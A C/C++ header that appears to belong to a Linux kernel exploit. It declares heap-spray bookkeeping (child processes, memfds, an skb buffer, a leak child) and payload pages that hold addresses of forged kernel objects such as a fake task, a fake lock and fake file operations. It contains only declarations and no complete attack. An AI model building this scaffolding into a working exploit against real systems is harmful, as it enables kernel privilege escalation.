#ifndef HEAP_CONTEXT_H
#define HEAP_CONTEXT_H

#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>

#ifdef __cplusplus
#include <type_traits>
#endif

struct kernelsnitch_shared_state;

struct mm_ctx {
    size_t mm_cnt;
    pid_t *childs;
    int *memfds;
};

typedef enum PayloadPageState {
    PAYLOAD_PAGE_EMPTY = 0,
    PAYLOAD_PAGE_CURRENT,
    PAYLOAD_PAGE_PREBUILT,
    PAYLOAD_PAGE_QUARANTINED,
} PayloadPageState;

typedef struct ReclaimPair {
    int fd[2];
} ReclaimPair;

typedef struct PayloadPage {
    uintptr_t base;
    uintptr_t last_mm_struct;
    uintptr_t fake_lock;
    uintptr_t fake_w0;
    uintptr_t fake_task;
    uintptr_t fake_parent;
    uintptr_t fake_right;
    uintptr_t fake_left;
    uintptr_t fake_fops;
    ReclaimPair reclaim;
    PayloadPageState state;
#ifdef __cplusplus
    /* Move-only owner of one payload page and its reclaim socket pair.
     *
     * There is deliberately no destructor: a page whose fds may still be
     * referenced by the kernel must never be released by scope exit. Use
     * destroy() for the explicit release and move_to() to transfer ownership.
     * A moved-from page is left empty; the fds travel with the destination. */
    PayloadPage() noexcept;
    PayloadPage(const PayloadPage &) = delete;
    PayloadPage &operator=(const PayloadPage &) = delete;
    PayloadPage(PayloadPage &&other) noexcept;
    PayloadPage &operator=(PayloadPage &&) = delete;

    [[nodiscard]] bool has_reclaim() const noexcept;
    void destroy() noexcept;
    [[nodiscard]] bool move_to(PayloadPage &destination,
                               PayloadPageState destination_state) noexcept;
#endif
} PayloadPage;

#ifdef __cplusplus
static_assert(std::is_standard_layout_v<PayloadPage>);
static_assert(!std::is_copy_constructible_v<PayloadPage>);
static_assert(!std::is_copy_assignable_v<PayloadPage>);
static_assert(std::is_move_constructible_v<PayloadPage>);
/* No implicit release on scope exit: the destructor stays trivial. */
static_assert(std::is_trivially_destructible_v<PayloadPage>);
#endif

typedef struct HeapContext {
    struct kernelsnitch_shared_state *snitch;
    size_t mm_objs_per_slab;
    unsigned char *skb_buffer;
    struct mm_ctx prepare;
    struct mm_ctx spray;
    struct mm_ctx pre;
    struct mm_ctx post;
    pid_t leak_child;
    int leak_memfd;
    PayloadPage current;
    PayloadPage prebuilt;
    PayloadPage quarantine;
} HeapContext;

#ifdef __cplusplus
extern HeapContext &g_heap_context;
#else
extern HeapContext g_heap_context;
#endif

void heap_context_init(HeapContext *context);

int payload_page_has_reclaim(const PayloadPage *page);

void payload_page_destroy(PayloadPage *page);

int payload_page_move(
        PayloadPage *destination, PayloadPage *source,
        PayloadPageState destination_state);

#endif
